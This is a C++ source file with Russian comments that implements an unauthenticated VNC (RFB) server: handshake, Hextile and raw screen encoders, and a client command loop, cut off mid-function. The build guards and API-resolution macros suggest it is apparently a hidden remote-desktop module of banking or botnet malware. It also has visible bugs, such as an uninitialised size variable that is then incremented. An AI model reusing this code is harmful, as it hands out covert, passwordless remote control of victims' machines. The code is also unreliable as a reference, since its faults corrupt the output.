#include <windows.h>
#include <ws2tcpip.h>

#include "..\defines.h"
#include "rfb.h"

#include "..\..\common\mem.h"
#include "..\..\common\str.h"
#include "..\..\common\wsocket.h"
#include "..\..\common\debug.h"
#include "..\..\common\gdi.h"

/*
  TODO:
    1. Сделать поддержку ENCODER_DesktopSize(WM_DISPLAYCHANGE).
    2. Сделать поддержку VNCAuth.
    3. Реагировать на изменеие палитры (WM_SYSCOLORCHANGE, WM_PALETTECHANGED).
    4. Реагировать на завершение работы ос.
    5. Сделать SetColourMapEntries, в данный момент не на чем тестить.
    6. Понять почему при увелечнии разрешения цикл вылетает.
    7. Конвертация палитры.
    8. Оптимизировать кодеки.
    9. Придумат  алгоритм чтобы во время длительного получения команд от клиента, между ними отправлять
       запрос на прорисовку.
*/

#if(BO_VNC > 0)

//Размер квадрата обноволений.
#define RECT_SIZE 96

////////////////////////////////////////////////////////////////////////////////////////////////////

//События мыши.
#define MASK_POINTER_BUTTON_LEFT   0x01
#define MASK_POINTER_BUTTON_MIDDLE 0x02
#define MASK_POINTER_BUTTON_RIGHT  0x04
#define MASK_POINTER_WHEEL_UP      0x08
#define MASK_POINTER_WHEEL_DOWN    0x10

void Rfb::init(void)
{

}

void Rfb::uninit(void)
{

}

/*
  Быстрое копированиие пикселей.

  OUT dest        - адрес назначения.
  IN source       - исходный адрес.
  IN widthinbytes - кол. байтов занемаемых пикселями.
*/
#define COPY_RECT_LINE(dest, source, widthinbytes) \
{\
  register LPBYTE pNew    = (LPBYTE)(dest);\
  register LPBYTE pOld    = (LPBYTE)(source);\
  register LPBYTE pOldMax = pOld + (widthinbytes);\
  \
  if(pid->bRemotePixelSize == 1){COPY_RECT_LINE_P(BYTE);}\
  else if(pid->bRemotePixelSize == 2){COPY_RECT_LINE_P(BYTE);}\
  else if(pid->bRemotePixelSize == 4){COPY_RECT_LINE_P(BYTE);}\
}
#define COPY_RECT_LINE_P(var_type) \
{\
  while(pOld < pOldMax)\
  {\
    *((var_type *)pNew) = *((var_type *)pOld);\
    pNew += sizeof(var_type);\
    pOld += sizeof(var_type);\
  }\
}

//FIXME
static __inline void LocalPixelToRemotePixel(Rfb::INTERNAL_DATA *pid, void *pcrLocalPixel, void *pcrRemotePixel)
{
  if(pid->bRemotePixelSize == 1)
  {
  
  }
  else if(pid->bRemotePixelSize == 2)
  {
    *((LPWORD)pcrRemotePixel) = 0;
  }
  else if(pid->bRemotePixelSize == 4)
  {
    *((LPDWORD)pcrRemotePixel) = 0;
  }

  Mem::_copy(pcrRemotePixel, pcrLocalPixel, min(pid->bLocalPixelSize, pid->bRemotePixelSize));
}

__inline void Translate(Rfb::INTERNAL_DATA *pid, BYTE *source, BYTE *dest, WORD wX, WORD wY, WORD wWidth, WORD wHeight)
{
  DWORD dwMaxLx = (((wY + wHeight - 1) * pid->wWidth) + wX) * pid->bLocalPixelSize;
  DWORD dwLx    = (wY * pid->wWidth + wX) * pid->bLocalPixelSize;
  wWidth *= pid->bLocalPixelSize;

  for(; dwLx <= dwMaxLx; dwLx += pid->dwWidthInBytes)
  {
    LPBYTE p = pid->pBmpDIB + dwLx;
    for(DWORD i = 0; i < wWidth; i += pid->bLocalPixelSize)
    {
      LocalPixelToRemotePixel(pid, p + i, dest);
      dest += pid->bRemotePixelSize;
    }
    COPY_RECT_LINE(pid->pBmpDIBOld + dwLx, p, wWidth);
  }
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Hextile encoder
////////////////////////////////////////////////////////////////////////////////////////////////////
namespace HextileEncoder
{
  #define HEXTILE_BUFFER_SIZE (16 * 16 * 4)
  
  #define rfbHextileRaw                 (1 << 0)
  #define rfbHextileBackgroundSpecified (1 << 1)
  #define rfbHextileForegroundSpecified (1 << 2)
  #define rfbHextileAnySubrects         (1 << 3)
  #define rfbHextileSubrectsColoured    (1 << 4)

  #define rfbHextilePackXY(x,y)    (((x) << 4) | (y))
  #define rfbHextilePackWH(w,h)    ((((w)-1) << 4) | ((h)-1))
  #define rfbHextileExtractX(byte) ((byte) >> 4)
  #define rfbHextileExtractY(byte) ((byte) & 0xf)
  #define rfbHextileExtractW(byte) (((byte) >> 4) + 1)
  #define rfbHextileExtractH(byte) (((byte) & 0xf) + 1)

  #define PUT_PIXEL8(pix) (dest[destoffset++] = (pix))
  #define PUT_PIXEL16(pix) (dest[destoffset++] = ((char*)&(pix))[0], dest[destoffset++] = ((char*)&(pix))[1])
  #define PUT_PIXEL32(pix) (dest[destoffset++] = ((char*)&(pix))[0], dest[destoffset++] = ((char*)&(pix))[1], dest[destoffset++] = ((char*)&(pix))[2], dest[destoffset++] = ((char*)&(pix))[3])

  #define DEFINE_HEXTILES(bpp, var_type)\
  __inline void testColours##bpp(var_type *data, int size, bool *mono, bool *solid, var_type *bg, var_type *fg)\
  {\
    var_type colour1 = 0, colour2 = 0;\
    DWORD n1 = 0, n2 = 0;\
    *mono = true;\
    *solid = true;\
    for(; size > 0; size--, data++)\
    {\
      if(n1 == 0)colour1 = *data;\
      if(*data == colour1){n1++; continue;}\
      if(n2 == 0){*solid = false; colour2 = *data;}\
      if(*data == colour2){n2++; continue;}\
      *mono = false;\
      break;\
    }\
    if(n1 > n2){*bg = colour1; *fg = colour2;}\
    else{*bg = colour2; *fg = colour1;}\
  }\
  __inline UINT subrectEncode##bpp(var_type *src, BYTE *dest, int w, int h, var_type bg, var_type fg, bool mono)\
  {\
    var_type cl;\
    int i, j;\
    int hx = 0, hy, vx = 0, vy;\
    int hyflag;\
    var_type *seg;\
    var_type *line;\
    int hw, hh, vw, vh;\
    int thex, they, thew, theh;\
    int numsubs = 0;\
    int newLen;\
    int rectoffset = 0;\
    int destoffset = 1;\
    \
    for(int y = 0; y < h; y++)\
    {\
      line = src + (y * w);\
      for(int x = 0; x < w; x++)\
      {\
        if(line[x] != bg)\
        {\
          cl = line[x];\
          hy = y - 1;\
          hyflag = 1;\
          for(j = y; j < h; j++)\
          {\
            seg = src + (j * w);\
            if (seg[x] != cl)break;\
            i = x;\
            while((i < w) && (seg[i] == cl))i += 1;\
            i -= 1;\
            if(j == y)vx = hx = i;\
            if(i < vx)vx = i;\
            if((hyflag > 0) && (i >= hx))hy += 1;\
            else hyflag = 0;\
          }\
          vy = j - 1;\
          \
          hw = hx - x + 1;\
          hh = hy - y + 1;\
          vw = vx - x + 1;\
          vh = vy - y + 1;\
          \
          thex = x;\
          they = y;\
          \
          if((hw*hh) > (vw*vh)){thew = hw; theh = hh;}\
          else {thew = vw; theh = vh;}\
          \
          if(mono)newLen = destoffset - rectoffset + 2;\
          else newLen = destoffset - rectoffset + bpp / 8 + 2;\
          \
          if(newLen > (w * h * (bpp/8)))return 0;\
          \
          numsubs += 1;\
          \
          if(!mono)PUT_PIXEL##bpp(cl);\
          \
          dest[destoffset++] = rfbHextilePackXY(thex,they);\
          dest[destoffset++] = rfbHextilePackWH(thew,theh);\
          \
          for(j = they; j < (they + theh); j++)for(i = thex; i < (thex + thew); i++)\
          {\
            if(j == -1)break;/*TMP ANTI _memset*/\
            src[j * w + i] = bg;\
          }\
        }\
      }\
    }\
    \
    dest[rectoffset] = numsubs;\
    return destoffset;\
  }\
  __inline DWORD Encode##bpp(Rfb::INTERNAL_DATA *pid, BYTE *source, BYTE *dest, int rx, int ry, int rw, int rh)\
  {\
    int rectoffset;\
    int destoffset = 0;\
    var_type bg, fg, newBg, newFg;\
    bool mono, solid;\
    bool validBg = false;\
    var_type *clientPixelData = (var_type *)pid->pHextileBuffer;\
    bool validFg = false;\
    \
    int k1 = ry + rh;\
    int k2 = rx + rw;\
    for(int y = ry; y < k1; y += 16)\
    {\
      for(int x = rx; x < k2; x += 16)\
      {\
        int w = 16;\
        int h = 16;\
        if(k2 - x < 16)w = k2 - x;\
        if(k1 - y < 16)h = k1 - y;\
        \
        Translate(pid, source, (LPBYTE)clientPixelData, x, y, w, h);\
        \
        rectoffset = destoffset;\
        dest[rectoffset] = 0;\
        destoffset++;\
        \
        testColours##bpp(clientPixelData, w * h, &mono, &solid, &newBg, &newFg);\
        \
        if(!validBg || (newBg != bg))\
        {\
          validBg = true;\
          bg = newBg;\
          dest[rectoffset] |= rfbHextileBackgroundSpecified;\
          PUT_PIXEL##bpp(bg);\
        }\
        \
        if(solid)continue;\
        \
        dest[rectoffset] |= rfbHextileAnySubrects;\
        \
        if(mono)\
        {\
          if(!validFg || (newFg != fg))\
          {\
            validFg = true;\
            fg = newFg;\
            dest[rectoffset] |= rfbHextileForegroundSpecified;\
            PUT_PIXEL##bpp(fg);\
          }\
        }\
        else\
        {\
          validFg = false;\
          dest[rectoffset] |= rfbHextileSubrectsColoured;\
        }\
        \
        int encodedbytes = subrectEncode##bpp(clientPixelData, dest + destoffset, w, h, bg, fg, mono);\
        destoffset += encodedbytes;\
        if(encodedbytes == 0)\
        {\
          validBg = false;\
          validFg = false;\
          destoffset = rectoffset;\
          dest[destoffset++] = rfbHextileRaw;\
          Translate(pid, source, (LPBYTE)clientPixelData, x, y, w, h);\
          Mem::_copy(dest + destoffset, (char *)clientPixelData, w * h * (bpp / 8));\
          \
          destoffset += w * h * (bpp / 8);\
        }\
      }\
    }\
    return destoffset;\
  }

  DEFINE_HEXTILES(8,  BYTE);
  DEFINE_HEXTILES(16, WORD);
  DEFINE_HEXTILES(32, DWORD);

  __inline DWORD GetMaxSize(Rfb::INTERNAL_DATA *pid)
  {
    return (RECT_SIZE * RECT_SIZE * pid->bRemotePixelSize) + (((RECT_SIZE / 16) + 1) * ((RECT_SIZE / 16) + 1));
  }

  __inline DWORD Encode(Rfb::INTERNAL_DATA *pid, LPBYTE pDest, DWORD dwLx, DWORD dwMaxLx, WORD wX, WORD wY, WORD wWidth, WORD wHeight, DWORD dwWidthInBytes)
  {
    switch(pid->bRemotePixelSize)
    {
      case 1: return Encode8 (pid, pid->pBmpDIB, pDest, wX, wY, wWidth, wHeight);
      case 2: return Encode16(pid, pid->pBmpDIB, pDest, wX, wY, wWidth, wHeight);
      case 4: return Encode32(pid, pid->pBmpDIB, pDest, wX, wY, wWidth, wHeight);
    }

    return 0;
  }   
};

////////////////////////////////////////////////////////////////////////////////////////////////////
// Raw encoder
////////////////////////////////////////////////////////////////////////////////////////////////////
namespace RawEncoder
{
  DWORD dwLastSize;
  __inline DWORD GetMaxSize(Rfb::INTERNAL_DATA *pid)
  {
    return (dwLastSize = (RECT_SIZE * RECT_SIZE * pid->bRemotePixelSize));
  }

  __inline DWORD Encode(Rfb::INTERNAL_DATA *pid, LPBYTE pDest, DWORD dwLx, DWORD dwMaxLx, DWORD dwWidthInBytes)
  {
    for(; dwLx <= dwMaxLx; dwLx += pid->dwWidthInBytes)
    {
      LPBYTE p = pid->pBmpDIB + dwLx;
      for(DWORD i = 0; i < dwWidthInBytes; i += pid->bLocalPixelSize)
      {
        LocalPixelToRemotePixel(pid, p + i, pDest);
        pDest += pid->bRemotePixelSize;
      }
      COPY_RECT_LINE(pid->pBmpDIBOld + dwLx, p, dwWidthInBytes);
    }
    return dwLastSize;
  }
};

////////////////////////////////////////////////////////////////////////////////////////////////////

#define SEARCH_RECT_CHANGES(var_type) \
{\
  for(DWORD a = dwLx; a <= dwMaxLx; a += pid->dwWidthInBytes)\
  {\
    register LPBYTE pNew    = pid->pBmpDIB + a;\
    register LPBYTE pOld    = pid->pBmpDIBOld + a;\
    register LPBYTE pOldMax = pOld + dwRectWidthInBytes;\
    \
    while(pOld < pOldMax)\
    {\
      if(*((var_type *)pNew) != *((var_type *)pOld))goto RECT_CHANGED;\
      pNew += sizeof(var_type);\
      pOld += sizeof(var_type);\
    }\
  }\
}

/*
  Отправка изменных областей клиенту.

  IN s   - сокет.
  IN pid - данные.

  Return - -1 - внутрення ошибка.
            0 - ошибка отправки.
            1 - данные отправлены.
            2 - измененых областей не найдено.
*/
static int SendChangedRects(SOCKET s, Rfb::INTERNAL_DATA *pid, Rfb::RECTANGLE *pr)
{
  if(pr->wWidth == 0 || pr->wHeight == 0)return 0;

  int iRetVal         = -1;
  LPBYTE pChangesList = NULL;
  DWORD dwChangesSize = 0;
  DWORD dwChanges     = 0;
  WORD wXLast         = pr->wXPos + pr->wWidth;
  WORD wYLast         = pr->wYPos + pr->wHeight;      

  for(WORD wRectX = pr->wXPos, wRectWidth = RECT_SIZE; ; wRectX += wRectWidth)
  {
    wRectWidth = wXLast - wRectX;
    wRectWidth = min(RECT_SIZE, wRectWidth);
    if(wRectX >= wXLast || wRectWidth == 0)break;
    
    DWORD dwRectWidthInBytes = wRectWidth * pid->bLocalPixelSize;

    for(WORD wRectY = pr->wYPos, wRectHeight = RECT_SIZE; ; wRectY += wRectHeight)
    {
      wRectHeight = wYLast - wRectY;
      wRectHeight = min(RECT_SIZE, wRectHeight);
      if(wRectY >= wYLast || wRectHeight == 0)break;

      DWORD dwMaxLx = (((wRectY + wRectHeight - 1) * pid->wWidth) + wRectX) * pid->bLocalPixelSize;
      DWORD dwLx    = (wRectY * pid->wWidth + wRectX) * pid->bLocalPixelSize;
      
      //Получаем изменение в квадрате.
      if(pr->bIncremental != FALSE)
      { 
        //Здесь основная нагрузка на CPU.
        if(pid->bLocalPixelSize == 1){SEARCH_RECT_CHANGES(BYTE);}
        else if(pid->bLocalPixelSize == 2){SEARCH_RECT_CHANGES(WORD);}
        else if(pid->bLocalPixelSize == 4){SEARCH_RECT_CHANGES(DWORD);}
        continue;
      }

      //Измененя найдены.
      {
        RECT_CHANGED:
        DWORD dwMaxRectSize;
        switch(pid->dwCurrentEncoder)
        {
          case Rfb::ENCODER_Hextile: dwMaxRectSize += HextileEncoder::GetMaxSize(pid); break;
          default:                   dwMaxRectSize += RawEncoder::GetMaxSize(pid);
        }

        if(Mem::reallocEx(&pChangesList, dwChangesSize + sizeof(Rfb::RECTANGLEEX) + dwMaxRectSize))
        {
          Rfb::RECTANGLEEX *pCurRect = (Rfb::RECTANGLEEX *)(pChangesList + dwChangesSize);
          LPBYTE pCurData = ((LPBYTE)pCurRect) + sizeof(Rfb::RECTANGLEEX);
          
          pCurRect->wXPos          = SWAP_WORD(wRectX);
          pCurRect->wYPos          = SWAP_WORD(wRectY);
          pCurRect->wWidth         = SWAP_WORD(wRectWidth);
          pCurRect->wHeight        = SWAP_WORD(wRectHeight);
          pCurRect->dwEncodingType = pid->dwCurrentEncoderSwapped;

          switch(pid->dwCurrentEncoder)
          {
            case Rfb::ENCODER_Hextile: dwMaxRectSize = HextileEncoder::Encode(pid, pCurData, dwLx, dwMaxLx, wRectX, wRectY, wRectWidth, wRectHeight, dwRectWidthInBytes); break;
            default:                   dwMaxRectSize = RawEncoder::Encode(pid, pCurData, dwLx, dwMaxLx, dwRectWidthInBytes);
          }

          if(dwMaxRectSize > 0)
          {
            dwChangesSize += sizeof(Rfb::RECTANGLEEX) + dwMaxRectSize;
            dwChanges++;
          }
        }
      }
    }
  }
  
  if(dwChanges == 0)iRetVal = 2;
  else
  {
    //Отправка клиенту.
    WORD wHdr[2];

    //((LPBYTE)&wHdr)[0] = 0;//FramebufferUpdate
    //((LPBYTE)&wHdr)[1] = 0;//Padding

    wHdr[0] = 0; //FramebufferUpdate
    wHdr[1] = SWAP_WORD(dwChanges);

    iRetVal = (WSocket::tcpSend(s, wHdr, sizeof(wHdr)) && WSocket::tcpSend(s, pChangesList, dwChangesSize)) ? 1 : 0;
  }
  Mem::free(pChangesList);

  return iRetVal;
}

/*
  Проверяет валидные ли данные о пиксиле.

  IN ppf - стуктура для проверки.

  Return - true - если валидные,
           false - не валидные.
*/
static bool IsValidPIXEL_FORMAT(Rfb::PIXEL_FORMAT *ppf, bool bIsLocal)
{
  if(ppf->bBitsPerPixel == 32 || ppf->bBitsPerPixel == 16 || ppf->bBitsPerPixel == 8)
  {
    if(ppf->bTrueColour == FALSE && (!bIsLocal || ppf->bBitsPerPixel != 8))return false;
    return true;
  }
  return false;
}

/*
  Преобразует маску цвета в макс. значение цвета и смещение.

  IN dwMask   - маска.
  OUT pdwMax  - максимальное значение.
  OUT pbShift - смешение цвета.
*/
static void MaskToMaxAndShift(DWORD dwMask, LPWORD pwMax, LPBYTE pbShift)
{
  BYTE s = 0;
  for(s = 0; (dwMask & 1) == 0; s++)dwMask >>= 1;

  *pwMax   = (WORD)dwMask;
  *pbShift = s;
}

/*
  Полная инициализация Rfb::INTERNAL_DATA. (на основе UltaVNC).

  IN memoryDc - DC для работы.

  Return     - Rfb::INTERNAL_DATA, или NULL в случаи ошибки.
*/
static inline Rfb::INTERNAL_DATA *InitINTERNAL_DATA(HDC memoryDc, POINT *pSize, HANDLE hDIBMap, DWORD mapOffset)
{
  Rfb::INTERNAL_DATA *pid = (Rfb::INTERNAL_DATA *)Mem::alloc(sizeof(Rfb::INTERNAL_DATA));
  if(pid == NULL)return NULL;
  
  bool ok = false;
  pid->memoryDc = memoryDc;
  pid->wWidth  = (WORD)pSize->x;
  pid->wHeight = (WORD)pSize->y;
  //pid->dwCurrentEncoder      = Rfb::ENCODER_Raw;
  //pid->dwCurrentEncoderSwapped = SWAP_DWORD(Rfb::ENCODER_Raw);

  if(hDIBMap != NULL)
  {
    BITMAPINFO *pbmi;

    if((pid->hBitmap = Gdi::_createDibSection(pid->memoryDc, pid->wWidth, pid->wHeight, &pbmi, (void **)&pid->pBmpDIB, hDIBMap, mapOffset)) != NULL)
    {
      pid->bLocalPixelSize = pbmi->bmiHeader.biBitCount / 8;
      pid->dwWidthInBytes  = pid->wWidth * pid->bLocalPixelSize;
      pid->dwWidthInBytes  = ALIGN_UP(pid->dwWidthInBytes, sizeof(DWORD)); //The scan lines must be aligned on a DWORD except for RLE compressed bitmaps

      //Заполняем даные о пиксиле.
      pid->pfLocalPixel.bBitsPerPixel = pbmi->bmiHeader.biBitCount;
      pid->pfLocalPixel.bDepth        = pbmi->bmiHeader.biBitCount;
      pid->pfLocalPixel.bBigEndian    = FALSE;
      pid->pfLocalPixel.bTrueColour   = pbmi->bmiHeader.biBitCount == 8 ? FALSE : TRUE;
    
      //if(IsValidPIXEL_FORMAT(&pid->pfLocalPixel, true))
      {
        if(pid->pfLocalPixel.bTrueColour == TRUE)
        {
          DWORD dwRedMask, dwBlueMask, dwGreenMask;

          if(pbmi->bmiHeader.biBitCount == 16)     {dwRedMask = 0x7C00;   dwGreenMask = 0x03E0; dwBlueMask = 0x001F;}
          else if(pbmi->bmiHeader.biBitCount == 32){dwRedMask = 0xFF0000; dwGreenMask = 0xFF00; dwBlueMask = 0x00FF;}

          MaskToMaxAndShift(dwRedMask,   &pid->pfLocalPixel.wRedMax,   &pid->pfLocalPixel.bRedShift);
          MaskToMaxAndShift(dwGreenMask, &pid->pfLocalPixel.wGreenMax, &pid->pfLocalPixel.bGreenShift);
          MaskToMaxAndShift(dwBlueMask,  &pid->pfLocalPixel.wBlueMax,  &pid->pfLocalPixel.bBlueShift);
        }
        
        //Установка данных об клиетском пикселе по умолчанию.
        Mem::_copy(&pid->pfRemotePixel, &pid->pfLocalPixel, sizeof(Rfb::PIXEL_FORMAT));
        pid->pfRemotePixel.bTrueColour = TRUE;
        pid->bRemotePixelSize = pid->bLocalPixelSize;

        //Выделение памяти для буфера изменений.
        DWORD dwBmpSize = pid->dwWidthInBytes * pid->wHeight;
        if((pid->pBmpDIBOld = (LPBYTE)Mem::alloc(dwBmpSize)) != NULL)
        {
          if((pid->originalBitmap = (HBITMAP)CWA(gdi32, SelectObject)(pid->memoryDc, pid->hBitmap)) != NULL)ok = true;
          //Mem::_set(pid->pBmpDIBOld, 0xFF, dwBmpSize);
          
        }
      }
      
      Mem::free(pbmi);
      if(!ok)CWA(gdi32, DeleteObject)(pid->hBitmap);
    }
  }

  if(ok == false)
  {
    Mem::free(pid);
    pid = NULL;
  }
  
  return pid;
}

/*
  Полное освобождение ресурсов занятых под Rfb::INTERNAL_DATA.

  IN pid - стукрута для удаления.
*/
static void FreeINTERNAL_DATA(Rfb::INTERNAL_DATA *pid)
{
  CWA(gdi32, SelectObject)(pid->memoryDc, pid->originalBitmap);
  CWA(gdi32, DeleteObject)(pid->hBitmap);
  Mem::free(pid->pHextileBuffer);
  Mem::free(pid->pBmpDIBOld);
  Mem::free(pid->dwEncodingsList);
  Mem::free(pid);
}

/*
  Отправка ANSI-сообщения в формате [DWORD][BYTE[x]].

  IN s           - сокет.
  IN pstrMessage - сообщение.

  Return         - true - в случаи успеха,
                   false - в случаи ошибки.
*/
static bool SendANSIMessage(SOCKET s, LPSTR pstrMessage)
{
  DWORD dwLen = Str::_LengthA(pstrMessage);
  DWORD dwLenSwap = SWAP_DWORD(dwLen);
  return (WSocket::tcpSend(s, &dwLenSwap, sizeof(DWORD)) && (dwLen == 0 || WSocket::tcpSend(s, pstrMessage, dwLen))) ? true : false;
}

void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks, HANDLE hDIBMap, DWORD mapOffset, HANDLE updateMutex, DWORD dwRefreshInterval)
{
  #if defined(WDEBUG0)
  WDEBUG0(WDDT_INFO, "Session started");
  #endif

  /*
    Handshaking begins by the server sending the client a ProtocolVersion message. This
    lets the client know which is the highest Rfb protocol version number supported by
    the server.
  */
  if(!WSocket::tcpSend(s, "RFB 003.003\n", 12))return;

  /*
    The client then replies with a similar message giving the version number of
    the protocol which should actually be used (which may be different to that quoted by
    the server). A client should never request a protocol version higher than that offered
    by the server.
  */
  {
    char ver[13];

    if(!WSocket::tcpRecvAll(s, ver, sizeof(ver) - 1, dwTimeout) || Str::_CompareA(ver, "RFB ", 4, 4) != 0)return;
    
    ver[7] = 0;
    ver[11] = 0;

    WORD wClientVer = MAKEWORD(Str::_ToInt32A(ver + 4, NULL), Str::_ToInt32A(ver + 8, NULL));
    if(wClientVer > MAKEWORD(3, 6) || wClientVer < MAKEWORD(3, 3))return;
  }

  /*
    Once the protocol version has been decided, the server and client must agree on the
    type of security to be used on the connection.
  */
  {
    DWORD dwST = Rfb::ST_NONE;
    LPSTR pstrMessage = NULL;
    DWORD dwSTSwap;
   
    //Получение типа авторизации.
    pCallbacks->onSecurityType(pCallbacks->param, &dwST, &pstrMessage);
    dwSTSwap = SWAP_DWORD(dwST);
    if(!WSocket::tcpSend(s, &dwSTSwap, sizeof(DWORD)))dwST = ST_ERROR;
    
    //Реакция на тип авторизации.
    switch(dwST)
    {
      case Rfb::ST_NONE: break;
      case Rfb::ST_INVALID: SendANSIMessage(s, pstrMessage);
      default: return;
    }
  }

  /*
    Once the client and server are sure that they’re happy to talk to one another using the
    agreed security type, the protocol passes to the initialisation phase. The client sends a
    ClientInit message followed by the server sending a ServerInit message
  */
  {
    BYTE bShared;
    if(!WSocket::tcpRecvAll(s, &bShared, sizeof(BYTE), dwTimeout) || !pCallbacks->onClientInit(pCallbacks->param, bShared == 0 ? 0 : 1))return;
  }

  /*
    After receiving the ClientInit message, the server sends a ServerInit message. This
    tells the client the width and height of the server’s framebuffer, its pixel format and the
    name associated with the desktop
  */
  
  INTERNAL_DATA *pInternalData;

  {
    LPSTR pstrName = NULL;
    POINT size;
    HDC memoryDc = pCallbacks->onServerInit(pCallbacks->param, &pstrName, &size);
    
    if(memoryDc == NULL || (pInternalData = InitINTERNAL_DATA(memoryDc, &size, hDIBMap, mapOffset)) == NULL)return;
    
    //Осовные данные.
    DWORD dwNameLen = Str::_LengthA(pstrName);
    Rfb::MSG_SERVERINIT ServerInit;

    ServerInit.wFrameBufferWidth  = SWAP_WORD(pInternalData->wWidth);
    ServerInit.wFrameBufferHeight = SWAP_WORD(pInternalData->wHeight);
    ServerInit.dwNameLength       = SWAP_DWORD(dwNameLen);

    Mem::_copy(&ServerInit.pf, &pInternalData->pfLocalPixel, sizeof(Rfb::PIXEL_FORMAT));
    ServerInit.pf.wRedMax   = SWAP_WORD(ServerInit.pf.wRedMax);
    ServerInit.pf.wGreenMax = SWAP_WORD(ServerInit.pf.wGreenMax);
    ServerInit.pf.wBlueMax  = SWAP_WORD(ServerInit.pf.wBlueMax);

    //Отпровляем ответ.
    if(!WSocket::tcpSend(s, &ServerInit, sizeof(Rfb::MSG_SERVERINIT)) || (dwNameLen > 0 && !WSocket::tcpSend(s, pstrName, dwNameLen)))
    {
      FreeINTERNAL_DATA(pInternalData);
      return;
    }
  }
  
  //Последнее состояние мышы.
  EVENT_POINTER epLast;
  epLast.bButtonMask = 0;
  epLast.wXPos = 0xFFFF;
  epLast.wYPos = 0xFFFF;

  //Последнее состояние клавы.
  BYTE ekVirtualCodes[0xFF];
  BYTE ekCharCodes[0xFF];
  Mem::_zero(ekVirtualCodes, sizeof(ekVirtualCodes));
  Mem::_zero(ekCharCodes, sizeof(ekCharCodes));

  //Список областей, которые ожидают обновления.
  DWORD dwWaitRectsCount  = 0;
  RECTANGLE *prcWaitRects = NULL;

  //Цикл обработки "Client to server messages".
  for(;;)
  {
    //Ожидание изменений, который не удалось получить в момент получения FramebufferUpdateRequest.
    if(dwWaitRectsCount > 0 && WSocket::tcpWaitForEvent(&s, 1, dwRefreshInterval, NULL, 0) == INVALID_SOCKET)
    {
      if(CWA(ws2_32, WSAGetLastError)() != WSAETIMEDOUT)goto END_LOOP;

      if(updateMutex != NULL)CWA(kernel32, WaitForSingleObject)(updateMutex, INFINITE);
      pCallbacks->OnUpdateDC(pCallbacks->param);
      for(DWORD i = 0; i < dwWaitRectsCount; i++)if(prcWaitRects[i].wWidth > 0 && prcWaitRects[i].wHeight > 0)
      {
        switch(SendChangedRects(s, pInternalData, &prcWaitRects[i]))
        {
          case -1:;
          case  0:
            if(updateMutex != NULL)CWA(kernel32, ReleaseMutex)(updateMutex);
            goto END_LOOP;
          
          case  1:
            if(i + 1 == dwWaitRectsCount)Mem::reallocEx(&prcWaitRects, sizeof(RECTANGLE) * (--dwWaitRectsCount));
            else Mem::_zero(&prcWaitRects[i], sizeof(RECTANGLE));
            break;
          //case  2: break;
        }
      }
      if(updateMutex != NULL)CWA(kernel32, ReleaseMutex)(updateMutex);
      continue;
    }

    //Получение команды.
    BYTE bMsg;
    if(!WSocket::tcpRecvAll(s, &bMsg, sizeof(BYTE), dwTimeout))goto END_LOOP;
    
    switch(bMsg)
    {
      /*
        Sets the format in which pixel values should be sent in FramebufferUpdate messages.
        If the client does not send a SetPixelFormat message then the server sends pixel values
        in its natural format as specified in the ServerInit message (section 6.3.2).
      */
      case 0: //SetPixelFormat
      {
        Rfb::PIXEL_FORMAT pf;
        
        if(!WSocket::tcpRecvAllToNull(s, 3, dwTimeout) || !WSocket::tcpRecvAll(s, &pf, sizeof(Rfb::PIXEL_FORMAT), dwTimeout))goto END_LOOP;
        if(!IsValidPIXEL_FORMAT(&pf, false))goto END_LOOP;
        
        pf.wRedMax     = SWAP_WORD(pf.wRedMax);
        pf.wGreenMax   = SWAP_WORD(pf.wGreenMax);
        pf.wBlueMax    = SWAP_WORD(pf.wBlueMax);
        
        //Параноя.
        pf.bTrueColour = pf.bTrueColour == 0 ? FALSE : TRUE;
        pf.bBigEndian  = pf.bBigEndian  == 0 ? FALSE : TRUE;

        Mem::_copy(&pInternalData->pfRemotePixel, &pf, sizeof(Rfb::PIXEL_FORMAT));
        pInternalData->bRemotePixelSize = pf.bBitsPerPixel / 8;
        break;
      }

      /*
        Sets the encoding types in which pixel data can be sent by the server. The order of the
        encoding types given in this message is a hint by the client as to its preference (the first
        encoding specified being most preferred). The server may or may not choose to make
        use of this hint. Pixel data may always be sent in raw encoding even if not specified
        explicitly here.
      */
      case 2: //SetEncodings
      {
        WORD wCount;

        if(!WSocket::tcpRecvAllToNull(s, 1, dwTimeout) || !WSocket::tcpRecvAll(s, &wCount, sizeof(WORD), dwTimeout))goto END_LOOP;
        pInternalData->dwCurrentEncoder = ENCODER_Raw;
        if((pInternalData->wEncodingsCount = SWAP_WORD(wCount)) > 0)
        {
          DWORD dwSize = pInternalData->wEncodingsCount * sizeof(DWORD);
          if(!Mem::reallocEx(&pInternalData->dwEncodingsList, dwSize) || !WSocket::tcpRecvAll(s, pInternalData->dwEncodingsList, dwSize, dwTimeout))goto END_LOOP;
          for(WORD i = 0; i < pInternalData->wEncodingsCount; i++)
          {
            pInternalData->dwEncodingsList[i] = SWAP_DWORD(pInternalData->dwEncodingsList[i]);

            //Выбираем лучший кодак на мой взгляд.
            if(pInternalData->dwEncodingsList[i] == ENCODER_Hextile)pInternalData->dwCurrentEncoder = ENCODER_Hextile;
          }
        }
        pInternalData->dwCurrentEncoderSwapped = SWAP_DWORD(pInternalData->dwCurrentEncoder);

        //Создаем или удаялем буфер Hexlite.
        if(pInternalData->dwCurrentEncoder == ENCODER_Hextile)
        {
          if(pInternalData->pHextileBuffer == NULL && (pInternalData->pHextileBuffer = Mem::alloc(HEXTILE_BUFFER_SIZE)) == NULL)goto END_LOOP;
        }
        else
        {
          Mem::free(pInternalData->pHextileBuffer);
          pInternalData->pHextileBuffer = NULL;
        }
        break;
      }

      /*
        Notifies the server that the client is interested in the area of the framebuffer specified
        by x-position, y-position, width and height. The server usually responds to a
        FramebufferUpdateRequest by sending a FramebufferUpdate. Note however that a single
        FramebufferUpdate may be sent in reply to several FramebufferUpdateRequests
      */
      case 3: //FramebufferUpdateRequest
      {
        RECTANGLE rect;
        if(!WSocket::tcpRecvAll(s, &rect, sizeof(RECTANGLE), dwTimeout))goto END_LOOP;
        
        rect.wXPos        = SWAP_WORD(rect.wXPos);
        rect.wYPos        = SWAP_WORD(rect.wYPos);
        rect.wWidth       = SWAP_WORD(rect.wWidth);
        rect.wHeight      = SWAP_WORD(rect.wHeight);
        rect.bIncremental = rect.bIncremental == FALSE ? FALSE : TRUE;
        
        //Добавляем квадрат в список.
        DWORD i = 0;
